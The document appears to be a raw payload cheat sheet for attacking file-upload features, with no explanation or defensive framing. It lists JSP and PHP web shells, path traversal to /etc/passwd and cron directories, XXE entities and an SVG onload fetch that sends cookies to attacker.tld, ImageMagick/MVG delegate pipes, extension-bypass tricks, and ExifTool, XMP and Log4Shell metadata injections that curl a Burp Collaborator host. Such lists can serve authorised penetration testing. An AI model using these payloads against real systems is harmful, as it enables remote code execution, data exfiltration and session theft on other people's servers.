../../../../var/www/html/shell.php
../../../etc/cron.d/x
/etc/passwd
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.tld/x">]>
<% Process p = Runtime.getRuntime().exec(request.getParameter("c")); %>
<%@ page import="java.util.*,java.io.*"%>
</svg>
<?php ... ?>
<?php phpinfo(); ?>
<?xml version="1.0" encoding="UTF-8"?>
<html><script>alert(1)</script></html>
<pre><% BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null) out.println(l); %></pre>
<root>&xxe;</root>
<script src="x.gif">
<script src=...>
<script>alert(document.domain)</script>
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//attacker.tld/x?'+document.cookie)">
AddType application/x-httpd-php .png
Content-Disposition: attachment; filename=...
Content-Type: image/jpeg
Content-Type: image/svg+xml
Content-Type: text/plain
GIF89a/*
disable_functions = system,exec,shell_exec,passthru,...
file:///etc/passwd
fill 'url(https://attacker.tld/x)'
https://target/uploads/avatar.svg
if ext == ".php": reject
link -> /etc/cron.d/
link/x
ln -s /etc/passwd link.txt
phar://
push graphic-context\nencoding "UTF-8"\nimage Over 0,0 0,0 'url(https://attacker.tld/x)'\npop graphic-context
readonly=false
shell.jsp/
shell.jsp?c=id
shell.php%00.jpg
system('id')
text/html
word/document.xml
# ExifTool / ImageMagick metadata injection — reaches RCE without extension bypass
# JSON body (multipart-form or JSON API) with newline-embedded shell in a metadata field:
{"Title\n-if\nsystem('curl BURP_COLLAB')||1\n-Comment":"x"}
# GraphicsMagick / MVG delegate — write PGM/SVG that opens |command
push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 '|/bin/sh -c "curl BURP_COLLAB"'\npop graphic-context
# ExifTool -stay_open via crafted control file argfile:
-stay_open\nTrue\n-@\n|curl BURP_COLLAB
# JFIF comment field with shell-quoted payload — often reflected in server logs / previews
$(curl BURP_COLLAB)
# XMP block — Adobe metadata parsers historically interpolate ${}
<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description>${jndi:ldap://BURP_COLLAB/x}</rdf:Description></rdf:RDF></x:xmpmeta>
# EXIF UserComment charset marker — some parsers eval() the value
UNICODE\x00${IFS}curl${IFS}BURP_COLLAB
